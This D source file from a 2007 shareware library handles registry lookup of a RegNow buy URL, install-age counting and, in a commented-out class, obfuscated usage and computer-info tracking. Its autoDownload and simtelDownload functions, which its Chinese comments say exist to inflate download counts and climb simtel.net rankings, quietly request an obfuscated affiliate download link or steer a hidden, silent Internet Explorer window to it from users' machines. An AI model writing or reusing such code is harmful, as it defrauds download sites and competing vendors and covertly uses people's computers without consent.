
// Written in the D programming language.

/*******************************************************************************

        Copyright:      Copyright (c) 2007  (yidabu  g m a i l at com) All rights reserved

        License:        BSD style: $(LICENSE)

        Version:        Initial release: 27 Nov 2007

        Authors:        yidabu ( D Programming Language China : http://bbs.d-programming-language-china.org )

*******************************************************************************/

// shareware about module

module ydb.Soft;

private import  tango.io.device.File,
                tango.io.FilePath,
                tango.util.digest.Md5,
                tango.net.Uri,
                tango.text.Util,
                tango.util.Convert;

private import Path = tango.io.Path;
private import tango.time.WallClock;


private import tango.net.http.HttpGet;

private import  dwin.text.Util,
                dwin.text.Unicode,
                dwin.text.Properties,
                dwin.io.crypt.Base64,
                dwin.io.Digest,
                dwin.sys.win32.Registry,
                dwin.sys.win32.SpecialPath,
                dwin.sys.win32.ie.IE;

private import  ydb.Crypt,
                ydb.Computer;


debug private import tango.util.log.Trace;



    /**
        Examples:
        ---
            char[] publisher = "CHINESE SOFTWARE";
            char[] appName = "2008 Calendar Chinese New Year";
            char[] appVer = "0";
            auto buyUrl = regNowBuyUrl(publisher, appName, appVer);
        ---

    */
    char[] regNowBuyUrl(char[] publisher, char[] appName, char[] appVer = "0")
    {
        char[] buyUrl;

        try
        {
            // form the registry key path
            char[] keyPath = "SOFTWARE\\Digital River\\SoftwarePassport\\" ~ publisher ~ "\\" ~ appName ~ "\\" ~ appVer;

            scope key = RegistryKey.localMachine.openSubKey(keyPath);
            if(key is null)
                key = RegistryKey.currentUser.openSubKey(keyPath);

            if(key !is null)
                buyUrl = key.getValue!(char[])("BuyURL");
        }
        catch(Exception e)
            version(ydbVerbose)
                Trace.formatln("regNowBuyUrl catch " ~ e.msg);
        return buyUrl;
    }


    /// days after installed
    int runDays(char[] path)
    {
        return (WallClock.now - Path.created(path)).days ; //要用卸载时不删除的文件来计算rundays
    }

    int runDays()
    {
        return (WallClock.now - Path.created(exePath())).days ; //要用卸载时不删除的文件来计算rundays
    }
    
    /// 测试能否把下载量刷上去
    /// http://www.simtel.net/product.download.php?id=149804&url=http%3A%2F%2Fwww.regnow.com%2Ftrialware%2Fdownload%2FDownload_send-email-from-command-line-trial.exe%3Fitem%3D17078-9%26affiliate%3D5300&itn=1
    ///
    void autoDownload(int delay = 5)
    {                            
        
        static const char[] ftpUploadUrl = ob!("http://www.simtel.net/product.download.php?id=150300&url=http%3A%2F%2Fwww.regnow.com%2Ftrialware%2Fdownload%2FDownload_command-line-ftp-upload-trial.exe%3Fitem%3D17078-10%26affiliate%3D5300&itn=1");
        try
        {
            autoDownload(xor(ftpUploadUrl), delay);
        }
        catch(Exception e)
        {}
        
    }
    
    void autoDownload(char[] url, int delay = 5)
    {                                    
        try
        {        
            scope get = new HttpGet(url);
            get.setTimeout(delay); // 5 seconds
            get.enableRedirect(false);
            get.encodeUri(false); //已经是经过转义的地址
            get.keepAlive(false);
            get.read();
        }
        catch(Exception e)
        {}
        
    }    
    
    //自动导航到simtel.net下载页面来刷下载量,使得排名靠前
    //要注意的是，regnow上传文件的名称不能更改，比如试用版总是这样的格式：command-line-ftp-upload-trial.exe
    bool simtelDownload(char[] url, int delay = 5)
    {
        try
        {        
            scope ie = new IE();
            ie.visible = false;
            ie.statusBar = false;
            ie.toolBar = false;
            ie.menuBar = false;
            ie.silent = true;
            ie.navigate(url);
            doEvents(delay);
            ie.stop();
            return true;
        }
        catch(Exception e) {}            
        return false;
    }


/**
    variable:

    vm = verify md5
    ir = run times
    m  = md5 last 10 hexdigest reverse
    ve = this.ver
    si = soft index
    iclickreg = click count of Registration
    iclickbuy = click count of Buy Now
    iclickhome = click count of Home
    iclickusage = click count of Usage
    em  = email
    ke  = regist key
    na  = computer name
    ck  = check, if purchased, val "1", else val "0"
    builddate  = build date, e.g. 11-Dec-2007


    Examples:
    ---

    auto soft = Soft();
    soft.index = "za";
    soft.ver  = "za";
    soft.load(false);
    Stdout(soft.toStringPost).newline;
    Stdout(soft.toStringLocale).newline;


    ---

*/

/+
class Soft
{
    this()
    {

    }

        static Soft opCall()
        {
            return new Soft();
        }

    //not reach here ?
    ~this()
    {
        version(ydbVerbose)
            Trace.formatln("Soft ~this called");
        //this.write();
    }



    Md5 md5()
    {
        //auto exeSrc =cast(ubyte[]) (new File(.exePath)).read;
        return getMd5(path);
    }


    FilePath path()
    {
        return FilePath(.exePath);
    }

    FilePath dir()
    {
        return FilePath(.exeDir);
    }

    FilePath rPath()    //r = regist records
    {
        assert(this.ver.length, "you forgot set soft version");

        return this.dir.cat(this.ver ~ ".r");
    }

    FilePath confPath()
    {
        assert(this.ver.length, "you forgot set soft version");

        return this.dir.cat(this.ver ~ ".conf");
    }

    //conf file, normal config file, simple crypt
    char[][char[]] [char[]] conf()
    {
        static bool loaded;
        if(!loaded)
        {
            loaded = true;
            this.confLoad();
        }
        return this.conf_;
    }

    void conf(char[][char[]] [char[]] arr)
    {
        this.conf_ = arr;
    }

    void confLoad()
    {
        assert(this.ver.length, "you forgot set soft version");

        if(!this.confPath.exists)
            return null;

        char[] tmp = (cast(char[]) (new File(this.confPath.dup.native.toString)).read).reverse;
        if(tmp.length)
            this.conf = iniLoad( Base64.decode(tmp) );
    }


    void confSave()
    {
        assert(this.ver.length, "you forgot set soft version");
        if(this.conf.length)
        {
            char[] tmp = Base64.encode( iniToUtf8(this.conf) );
            tmp = tmp.reverse;
            ( new File(this.confPath.dup.native.toString) ).write(tmp);
        }
    }

    void confSet(char[] section, char[] key, char[] value)
    {
        this.conf_[section][key] = value;
    }

    char[] confGet(char[] section, char[] key)
    {
        if(!this.conf.length)
            return null;
        char[][char[]]* p = (section in this.conf);
        if(p is null)
            return null;

        char[]* pp = (key in *p);
        return (pp is null) ? null : *pp;
    }

    size_t size()
    {
        return this.path.fileSize;
    }

    void ver(char[] v, bool over = true)
    {
        this.set("ver", v, over);
    }

    char[] ver()
    {
        return this.get("ver");
    }

    char[] index()
    {
        return this.get("softindex");
    }

    void index(char[] ind, bool over = true)
    {
        this.set("softindex", ind, over);
    }

    size_t runTimes()
    {
        char[]* p = "ir" in this.info;
        if(p != null)
            return to!(uint)(*p);
        else
            return 0;
    }

    /// load anaFile from rPath
    char[] [char[]] load(bool over = true)
    {
        char[] [char[]] result;

        if(!this.rPath.exists)   //means file .r file deleted by user
        {
            version(ydbVerbose)
                Trace.formatln("rPath {} not exists at Soft class", this.rPath.toString);

            this.rPath.createFile;
            return result;
        }

        char[] str = cast(char[]) (new File(this.rPath.dup.native.toString)).read;
        if(!str.length)
            return null;

        this.append( strToAssoc(Crypt.xor(Base64.decode(str)).reverse, SepA, SepB), over );

        //把exe文件的md5值取后10位，并反转，在服务器端校验时，先反转，再取后5位进行校验
        this.set("m", this.md5.hexDigest[$-10 .. $].reverse); //md5 verify
        this.set("ir", 1);      //run times + 1

        return this.info;
    }


    char[] [char[]] append(char[] [char[]] array, bool over = true)
    {
        foreach(k,v; array)
            this.set(k, v, over);
        return this.info;
    }

    char[] [char[]] append(char[] str, bool over = true)
    {
        return this.append( strToAssoc(str, SepA, SepB), over );
    }

    /*
    ///append string to url tail
    // not necessary, the best solution is append in server, not client
    char[] navAppend(char[] url)
    {
        char[] result;

        char[] ir = this.get("ir");
        char[] icb = this.get("icb");
        ushort DefLang = Computer.sysDefaultLangId();

        if(ir.length)
            result ~= "ir=" ~ ir;
        if(icb.length)
            result ~= "&icb=" ~ icb;
        if(DefLang)
            result ~= "&sl=" ~ to!(char[])(DefLang);

        if(this.index)
            result ~= "&si=" ~ this.index;      //to see refer from the soft
        if(this.ver)
            result ~= "&ve=" ~ this.ver;

        //soft means link from soft
        if(result.length)
            result = url.containsPattern("?") ? (url ~ "&soft&" ~ result) : (url ~ "?soft&" ~ result);
        else
            result = url;

        return result;
    }
    */

    void set(char[] key, int val)
    {
        version(ydbVerbose)
            Trace.formatln("Soft set called key : {}, val {}", key, val);

        char[]* p = key in info;
        if(p != null && key[0] == 'i')
        {
            this.info[key] = to!(char[]) (to!(int)(*p) + val);
        }
        else
        {
            this.info[key] = to!(char[]) (val);
        }
    }


    void set(char[] key, char[] val, bool over = true)  //over = is overwrite ?
    {
        version(ydbVerbose)
            Trace.formatln("Soft set called key : {}, val {}", key, val);

        if( (key in this.info) is null )
            this.info[key] = val;
        else
        {
            if(over)
                this.info[key] = val;
        }
    }

    void set(char[] str)
    {
        if( "Home"c.containsPattern(str) )
            this.set("iclickhome", 1);
        else if( "Usage, Love Calendar, Zodiac Calendar"c.containsPattern(str) )
            this.set("iclickusage", 1);
        else if( "Buy Now"c.containsPattern(str) )
            this.set("iclickbuy", 1);
        else if( "Registration, How to Buy"c.containsPattern(str) )
            this.set("iclickreg", 1);
    }

    char[] get(char[] key)
    {
        char[]* p = key in info;
        if(p != null)
            return *p;
        else
        {
            version(ydbVerbose)
                Trace.formatln("faile at Soft get of " ~ key);
            return null;
        }
    }

    void write()
    {
        (new File(this.rPath.dup.native.toString)).write(this.toStringLocale());
    }

    char[] toStringLocale()
    {
        return Base64.encode( Crypt.xor(assocToStr(this.info, SepA, SepB).reverse) );
    }


    char[] toStringPost()
    {
        char[] result;
        try
        {
            assert(this.ver.length, "you forget set version");
            assert(this.index.length, "you forget set soft index");

            /*
            char[] [char[]] a = this.info;
            a["m"] = this.md5.hexDigest[$-10 .. $].reverse; //
            a["ve"] = this.ver;         //version
            a["si"] = this.index;       //soft index
            */
            auto computer = new Computer();
            result = assocToStr(this.info, SepA, SepB) ~ "&" ~ computer.toStringPost;
        }//
        catch(Exception e)
            err("toStringPost", e.msg);

        return result;
    }

    /*
        //http://www.regnow.com/html/help/vendor/swplite.html
        CString CVCSampleDlg::regGetBuyURL(CString publisher, CString appName, CString appVer ) {
            HKEY hKey = NULL;
            CString buyURL = "";

            // form the registry key path
            CString keyPath = "SOFTWARE\\Digital River\\SoftwarePassport\\" + publisher + "\\" + appName + "\\" + appVer;

            // read the "BuyURL" value from HKEY_LOCAL_MACHINE branch first
            LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, keyPath,0,KEY_READ, &hKey);
            if (lRet != ERROR_SUCCESS) {
                // fail to read from HKEY_LOCAL_MACHINE branch, try HKEY_CURRENT_USER
                lRet = RegOpenKeyEx(HKEY_CURRENT_USER, keyPath,0,KEY_READ, &hKey);
            };

            if (lRet == ERROR_SUCCESS) {
                LPSTR   lpBuyURL   = buyURL.GetBuffer( 1024 );
                DWORD   dwSize   = 1024;

                // Read the "BuyURL" value from the registry key.
                RegQueryValueEx(hKey, "BuyURL",0, NULL, (LPBYTE)lpBuyURL, &dwSize);
                buyURL.ReleaseBuffer();

                RegCloseKey( hKey);
            }

            return buyURL;
        }
    */

    /**
        Examples:
        ---
            char[] publisher = "CHINESE SOFTWARE";
            char[] appName = "2008 Calendar Chinese New Year";
            char[] appVer = "0";
            auto buyUrl = regNowBuyUrl(publisher, appName, appVer);
        ---

    */
    char[] regNowBuyUrl(char[] publisher, char[] appName, char[] appVer = "0")
    {
        char[] buyUrl;

        try
        {
            // form the registry key path
            char[] keyPath = "SOFTWARE\\Digital River\\SoftwarePassport\\" ~ publisher ~ "\\" ~ appName ~ "\\" ~ appVer;

            scope key = RegistryKey.localMachine.openSubKey(keyPath);
            if(key is null)
                key = RegistryKey.currentUser.openSubKey(keyPath);

            if(key !is null)
                buyUrl = key.getValue!(char[])("BuyURL");
        }
        catch(Exception e)
            version(ydbVerbose)
                Trace.formatln("regNowBuyUrl catch " ~ e.msg);
        return buyUrl;
    }



    /*
    char[] toUri()
    {
        char[] result;
        try
        {
            char[] computer = Computer.toStringPost;
            char[] softInfo = this.toStringPost;
            result = computer ~ SepA ~ softInfo;

            auto uri = new Uri();
            result = uri.encode(result, uri.IncQuery);

        }
        catch(Exception e)
            version(ydbVerbose)
                Trace.formatln("catch {} at Soft class toUri func", e.msg);
        return result;
    }
    */

    void err(char[] name, char[] msg)
    {
        version(ydbVerbose)
            Trace.formatln("error: " ~ msg ~ " at " ~ name);
    }

    private:

        char[] [char[]] info;
        char[][char[]] [char[]] conf_;

        const char[]    SepA = "&",     //separator of url
                        SepB = "=";

}

+/
version (build) {
    debug {
        pragma(link, "debug-ydb");
    } else {
        pragma(link, "ydb");
    }
}
